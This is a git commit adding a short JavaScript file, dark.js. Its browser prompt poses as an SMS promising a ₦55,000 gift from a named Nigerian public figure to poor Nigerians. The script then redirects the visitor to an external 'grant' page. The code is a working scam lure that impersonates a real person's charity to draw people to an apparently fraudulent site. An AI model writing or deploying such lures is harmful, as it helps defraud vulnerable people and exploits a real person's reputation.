9370f4a9eb0136ed20087152376337859370db69
boss-bloq <nsisboy01@gmail.com>
2024-10-17 07:53:27 -0700

    Create dark.js

---
+++ dark.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM ₦55,000 GIFT '
+password=prompt('SMS: Hello, Claim your ₦55,000 Gift from Martins Vincent Otse popularly known as VeryDarkMan Supporting Poor Nigerians . Press Ok to Claim now ','CLAIM ₦55,000 GIFT');
+if (password != 'CLAIM ₦55,000 GIFT') {
+location.href='https://damba-fest.org/55k-grant.html';
+}
